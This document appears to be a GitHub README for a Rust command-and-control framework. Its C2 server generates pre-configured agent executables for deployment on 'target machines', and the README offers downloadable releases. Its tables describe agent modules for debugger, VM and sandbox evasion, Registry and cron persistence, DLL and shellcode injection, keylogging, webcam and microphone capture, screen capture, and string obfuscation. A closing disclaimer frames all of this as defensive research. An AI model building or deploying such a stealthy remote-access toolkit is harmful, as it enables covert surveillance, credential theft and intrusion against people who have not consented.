# Rust Remote Admin

Research/educational Rust workspace implementing authenticated remote-administration primitives — mTLS sessions, agent connection management, process/file/registry collection, remote command execution, and platform-specific hardening research modules.

All sensitive capabilities (injection, keylogging, capture, persistence, anti-analysis) are documented research examples with platform-specific implementations behind `#[cfg()]` attributes.

## Binaries

Two shipped artifacts per platform. The C2 generates the client executable.

| Component | Purpose |
|-----------|---------|
| `rust-remote-admin-c2.exe` | Control server: listens for agents, queues commands, tracks health, **generates agent binaries** |
| `rust-remote-admin-agent.exe` | Pre-compiled template for `generate-agent` command — not a standalone release artifact |

The agent binary is **not a standalone executable**. It ships as a template and the C2 patches it with connection details. This ensures every deployed agent knows where to connect without config files or CLI args.

Download both from [GitHub Releases](https://github.com/riceharvest/rust-remote-admin/releases).

### Using the C2

```sh
# 1. Start the C2 server
rust-remote-admin-c2 server 0.0.0.0:9000

# 2. (in another terminal) Generate a configured agent
rust-remote-admin-c2 generate-agent \
  --c2-address 192.168.1.100:9000 \
  --cert-fingerprint sha256:abc123... \
  --agent-id 1 \
  --output client.exe

# (--template is optional — defaults to embedded template)
# Override with an external template:
#   --template custom-agent.exe

# 3. Deploy client.exe on the target machine
#    It connects to 192.168.1.100:9000 and waits for commands

# 4. Verify template integrity
rust-remote-admin-c2 generate-agent \
  --template rust-remote-admin-agent.exe \
  --hash-template
```

**How it works:**
- A pre-compiled agent template is embedded in the C2 binary at build time
- The template has a `RRA_CONFIG_V1` marker in its data section
- `generate-agent` (without `--template`) uses the embedded template, locates the marker, and writes JSON config (C2 address, TLS fingerprint, agent ID, heartbeat interval) into the 512-byte config slot
- The resulting `.exe` is standalone — the agent reads its own binary at startup, finds the marker, and parses the config
- Falls back to CLI args or defaults if no embedded config is present
- Use `--template <path>` to override with an external `.exe`

### Release artifacts

Download `rust-remote-admin-c2.exe` (or `rust-remote-admin-c2` for Linux) from [GitHub Releases](https://github.com/riceharvest/rust-remote-admin/releases). That single binary is all you need — the agent template is already inside it.

`rust-remote-admin-agent.exe` is also published as a build artifact so you can inspect or override it, but you do not need to download it to use the tool.

## Crates

| Crate | Role |
|-------|------|
| `c2/core` | Client registry, per-client command queues, mTLS listener, heartbeat health tracking, **agent generator CLI** |
| `c2/generator` | Libraries for patching connection config into template agent binaries |
| `c2/gui` | Tauri v2 dashboard (client list, logs, live events) |
| `c2/plugins` | Operator-side plugin trait with echo example |
| `c2/relay` | Tokio TCP relay — cleartext, TLS-ingress, TLS-egress |
| `agent/core` | Command routing, heartbeat loop, exponential-backoff reconnect, mTLS/TLS/plain modes, **embedded config reader** |
| `agent/modules` | Process listing/kill, file I/O, registry, sysinfo, remote command execution |
| `agent/hardening` | Anti-analysis, persistence, DLL injection, keylogging, webcam/mic, desktop capture |
| `protocol` | Shared command/response types, **config marker & AgentConfig serialization** |
| `crypto` | AES-GCM payload encryption, mTLS session handling (cert loading, acceptor/connector builders, dev cert generation) |

## Config marker format

The `RRA_CONFIG_V1` marker occupies 512 bytes in the agent binary:

```
Offset 0:  "RRA_CONFIG_V1"  (11 bytes, magic marker)
Offset 11: <u32 LE length>   (4 bytes, JSON payload length)
Offset 15: <JSON payload>     (up to 497 bytes of AgentConfig)
Remainder: <zero padding>     (filled to 512 bytes total)
```

The agent scans its own executable at startup for the marker. The C2 generator finds the same marker and replaces the block.

## Platform implementations

| Module | Linux | Windows |
|--------|-------|---------|
| Anti-debug | ptrace TracerPid, timing checks | IsDebuggerPresent, NtQueryInformationProcess |
| VM detection | DMI vendor, CPU hypervisor flag, MAC OUI | Registry VM artifacts, CPU hypervisor flag |
| Sandbox detection | Low CPU/memory, analysis process names | Low CPU/memory, known sandbox binaries |
| Persistence | systemd user service, crontab, autostart entry | Registry Run keys (`reg add/delete`), scheduled tasks (`schtasks`) |
| DLL injection | ptrace + `/proc/<pid>/mem` shellcode + `dlopen` resolution | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` + `LoadLibraryW` |
| Keylogging | evdev `/dev/input/event*` with keycode mapping | `SetWindowsHookExW(WH_KEYBOARD_LL)` with thread-local buffer |
| Webcam/mic | V4L2 ioctl pipeline (QUERYCAP → S_FMT → REQBUFS → mmap → STREAMON → DQBUF), ALSA via `arecord` | Stub (requires Media Foundation/WASAPI crates) |
| Desktop capture | X11 via `x11rb` (get_image + BGR→RGB conversion) | Stub (requires DXGI/GDI crate) |
| String obfuscation | XOR-based compile-time string obfuscation | Same |

## Build

```sh
cargo check --workspace
cargo test --workspace     # 62+ tests
```

### Cross-compile Windows executables

```sh
rustup target add x86_64-pc-windows-gnu
sudo dnf install mingw64-gcc mingw64-winpthreads-static   # Fedora

# Build C2 + agent template
cargo build --release --target x86_64-pc-windows-gnu -p c2-core -p agent-core
```

Produces standalone `.exe` files with `+crt-static` — no external DLLs required.

### GUI (Tauri v2)

```sh
sudo dnf install webkit2gtk4.1-devel   # Linux dev deps
cargo build -p c2-gui
```

## Implementation status

### Done (v0.1.0 → v0.2.0)
- ✅ All platform modules implemented (process, file, registry, injection, keylog, capture, persistence, anti-analysis)
- ✅ Config marker (`RRA_CONFIG_V1`) embedded in agent binary at build time
- ✅ Agent scans own executable for config at startup
- ✅ `c2-generator` crate patches template binaries with connection config
- ✅ CLI `generate-agent` subcommand with `--template`, `--c2-address`, `--cert-fingerprint`, `--agent-id`, `--hash-template`
- ✅ Release workflow builds 2 artifacts per platform (C2 + agent template)
- ✅ Relay removed from default builds (optional, build with `-p c2-relay`)
- ✅ Agent template embedded directly in C2 binary — `--template` is optional

### Next
- ⬜ Windows tests for generated agent config loading
- ⬜ mTLS config embedding (certificate/key paths → embedded certs)
- ⬜ Batch `generate-agent` mode (N agents with sequential IDs)
- ⬜ Web UI for agent generation in Tauri GUI

## Security note

This project is for lawful, authorized research and administration only. The hardening modules document offensive techniques so defenders can understand and detect them. All platform-specific code is gated behind `#[cfg()]` and returns structured errors on unsupported platforms.

## License

MIT.
